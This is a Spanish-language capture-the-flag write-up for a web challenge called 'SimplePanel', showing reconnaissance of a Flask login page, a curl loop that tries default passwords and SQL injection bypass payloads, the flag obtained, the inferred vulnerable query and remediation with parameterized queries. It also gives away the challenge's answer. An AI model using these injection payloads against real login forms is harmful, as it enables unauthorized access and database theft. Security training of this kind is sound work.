# SimplePanel

| Campo | Detalle |
|---|---|
| **Categoría** | Web |
| **Puntos** | 100 |
| **Evento** | Kernel CTF — AHAU Team |
| **Autor del reto** | Lychi3 |
| **Objetivo** | `http://44.197.147.215:80` |
| **Descripción** | *"Un panel basico protegio por un login"* |
| **Vulnerabilidad** | SQL Injection en el login (bypass de autenticación) |
| **CWE** | CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) |
| **OWASP** | A03:2021 – Injection |

## 1. Reconocimiento

```text
$ curl -i http://44.197.147.215/
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.12.16
Content-Type: text/html; charset=utf-8
Content-Length: 1537
Connection: close
```

La cabecera `Server: Werkzeug/3.1.9 Python/3.12.16` indica que es una aplicación **Flask** de Python. El HTML contiene un único formulario:

```html
<h1>Panel de Admin</h1>
<form method="POST">
    <input type="text" name="username" placeholder="Usuario" required>
    <input type="password" name="password" placeholder="Contrasena" required>
    <button type="submit">Iniciar Sesion</button>
</form>
```

- El formulario no tiene `action`, así que el POST va a la misma ruta `/`.
- Los parámetros son `username` y `password`.
- No hay comentarios HTML ni JavaScript con pistas.

Enumeración de rutas comunes:

| Ruta | Respuesta |
|---|---|
| `/robots.txt` | 404 |
| `/login.php` | 404 |
| `/admin` | 404 |

Toda la superficie de ataque es el formulario de login.

## 2. Análisis

Un login con "usuario + contraseña" casi siempre valida contra una base de datos con una consulta parecida a esta:

```sql
SELECT * FROM users WHERE username='<input>' AND password='<input>';
```

Si los valores se concatenan directamente en la consulta, una comilla simple (`'`) permite cerrar la cadena e inyectar SQL. Se probaron en un solo script tanto credenciales por defecto como payloads de SQLi.

## 3. Explotación

```bash
for u in "admin" "admin' OR '1'='1' -- -" "admin'-- -" "' OR 1=1 -- -" "administrador" "root"; do
  for p in "admin" "admin123" "password" "123456" "x"; do
    r=$(curl -s --data-urlencode "username=$u" --data-urlencode "password=$p" http://44.197.147.215/)
    echo "$r" | grep -qiE "AHAU|flag|bienvenid|dashboard" && echo ">>> ENTRA: [$u] [$p]"
  done
done
```

Se usó `--data-urlencode` para que caracteres como `'`, espacios y `=` lleguen intactos al servidor.

Resultados:

| Usuario | Password | Resultado |
|---|---|---|
| `admin` | admin / admin123 / password / 123456 / x | ❌ |
| `administrador`, `root` | (cualquiera) | ❌ |
| `admin' OR '1'='1' -- -` | **cualquiera** | ✅ |
| `admin'-- -` | **cualquiera** | ✅ |
| `' OR 1=1 -- -` | **cualquiera** | ✅ |

Las credenciales por defecto no funcionan, pero los tres payloads de SQLi entran **con cualquier contraseña**. La respuesta:

```html
<title>Acceso Concedido</title>
<h1>Acceso Concedido</h1>
<p>Bienvenido, administrador.</p>
<div class="flag">AHAU{n1c3_s1mpl3_4uth_byp4ss}</div>
```

## 4. Causa raíz

Con el payload `admin'-- -`, la consulta queda así:

```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='x';
--                                       ^^^^ todo lo que sigue es comentario
```

- La `'` cierra el valor de `username`.
- `--` inicia un comentario SQL, así que la verificación de `password` desaparece.
- El `-` final garantiza que haya un espacio tras `--`, que MySQL exige. SQLite y PostgreSQL no lo necesitan, pero tampoco les estorba.

Con `' OR 1=1 -- -` la condición se vuelve siempre verdadera y la consulta devuelve el primer registro de la tabla, normalmente el administrador.

El código vulnerable probable (no se tiene el fuente, se infiere del comportamiento):

```python
query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
user = db.execute(query).fetchone()
if user:
    return render_template("flag.html")
```

## 5. Impacto

- Acceso al panel de administración sin credenciales.
- La misma inyección podría usarse con `UNION SELECT` para extraer toda la base de datos (usuarios, hashes, datos sensibles).

## 6. Remediación

Usar consultas **parametrizadas** y guardar contraseñas con hash:

```python
from werkzeug.security import check_password_hash

row = db.execute(
    "SELECT id, password_hash FROM users WHERE username = ?",
    (u,)
).fetchone()

if row and check_password_hash(row["password_hash"], p):
    login_user(row["id"])
```

Medidas adicionales:

- *Rate limiting* en el login (p. ej. `Flask-Limiter`).
- Mensajes de error genéricos.
- Usuario de base de datos con privilegios mínimos.

## 🚩 Flag

```text
AHAU{n1c3_s1mpl3_4uth_byp4ss}
```

---
[⬅ Volver al índice](../../README.md)
